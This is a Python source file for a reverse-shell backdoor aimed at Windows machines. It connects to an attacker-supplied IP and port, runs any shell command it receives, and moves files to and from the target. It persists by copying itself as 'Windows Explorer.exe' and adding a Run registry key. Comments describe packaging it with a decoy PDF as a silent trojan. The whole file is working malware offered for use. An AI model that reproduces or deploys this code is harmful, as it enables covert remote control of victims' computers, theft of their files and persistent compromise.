#!/usr/bin/env python
import socket
import subprocess
import json
import os
import sys
import shutil
import base64
import argparse, textwrap

class Reverse_Backdoor:
    def __init__(self, ip, port):
        self.persist()
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))
    
    def persist(self):
        tmp_file = os.environ["appdata"] + "\\Windows Explorer.exe"
        if not os.path.exists(tmp_file):
            shutil.copyfile(sys.executable, tmp_file)
            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v test /t REG_SZ /d "' + tmp_file + '"', shell=True)

    def send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())

    def receive(self):
        json_data = b''
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def exec_cmd(self, cmd):
        DEVNULL = open(os.devnull, "wb")
        return subprocess.check_output(cmd, shell=True, stderr=DEVNULL, stdin=DEVNULL)

    def change_dir(self, path):
        os.chdir(path)
        return f"[*] Changed working directory to {path}"

    def read_file(self, path):
        with open(path, "rb") as f:
            return base64.b64encode(f.read())

    def write_file(self, path, content):
        with open(path, "wb") as f:
            f.write(base64.b64decode(content.encode()))
            return "[*] Uploaded 1 file."

    def run(self):
        while True:
            command = self.receive()
            try:
                if command[0] == "exit":
                    self.connection.close()
                    sys.exit()
                elif command[0] == "cd" and len(command) > 1:
                    output = self.change_dir(command[1])
                elif command[0] == "download":
                    output = self.read_file(command[1]).decode()
                elif command[0] == "upload":
                    output = self.write_file(command[1], command[2])
                else:
                    output = self.exec_cmd(command).decode()
            except Exception:
                output = "[-] Error while executing command..."
            self.send(output)
            
def get_args():
    parser = argparse.ArgumentParser(description="\u001b[38;5;56m======================== Reverse Backdoor ========================", formatter_class=argparse.RawDescriptionHelpFormatter, epilog=textwrap.dedent('''
    \u001b[38;5;32m
Usage:
This program runs on target machine and gives us reverse shell connection. First run listener program on your machine then connect with running reverse_backdoor on target machine. Port and IP should be defined correctly.
        \nExample:
        # On kali machine:
        $ python listener.py --ip 192.168.1.1 --port 4444
        
        # On target machine:
        $ python reverse_backdoor.py --ip 192.168.1.1 --port 4444
        '''))    
    parser.add_argument("-i", "--ip", dest="ip", help="IP address to listen (Your IP).")
    parser.add_argument("-p", "--port", dest="port", help="Port to listen for connections.")
    args = parser.parse_args()
    return args

args = get_args()

# Create trojan:
# file_name = sys._MEIPASS + "/sample.pdf"
# subprocess.Popen(file_name, shell=True)

try:
    reverse_backdoor = Reverse_Backdoor(args.ip, int(args.port))
    reverse_backdoor.run()
except Exception:
    sys.exit()

# Convert to executable:
# > pyinstaller reverse_backdoor.py --add-data "<trojan_file>;." --onefile --noconsole
# Run background silently:
# > reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v test /t REG_SZ /d <exe>